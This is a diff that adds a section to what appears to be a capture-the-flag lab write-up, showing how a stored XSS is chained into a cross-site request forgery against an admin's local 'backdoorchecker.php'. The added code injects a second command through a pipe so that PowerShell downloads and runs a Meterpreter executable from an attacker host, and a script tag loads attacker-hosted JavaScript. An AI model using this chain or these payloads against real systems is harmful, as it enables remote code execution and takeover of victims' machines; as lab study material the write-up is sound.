@@ -371,3 +371,18 @@ It's pretty obvious that the problem is with the $_SERVER environment check in `
 
 #### The following day...
 Cross site request forgery... Yes, I had a hint. The XSS we had earlier could potentially be used to "bounce a request back" (I don't know if my analogy makes sense) to the admin's localhost, from himself, executing our own commands within a payload. There's no cross-origin policy or CSRF-Token implemented so it's possible.
+
+```js
+var request = XMLHttpRequest();
+var params = 'dir|powershell -c http://10.10.14.2:8000/x64-meterpreter.exe -outfile %temp%/meter.exe; cmd.exe /c %temp%/meter.exe';
+
+request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
+request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+request.send(params);
+```
+
+Using a bitwise OR will basically try to run both commands in PHP and we send the XSS to the admin (again):
+```js
+<script src='http://10.10.14.2/mailer.js'></script>
+```
+
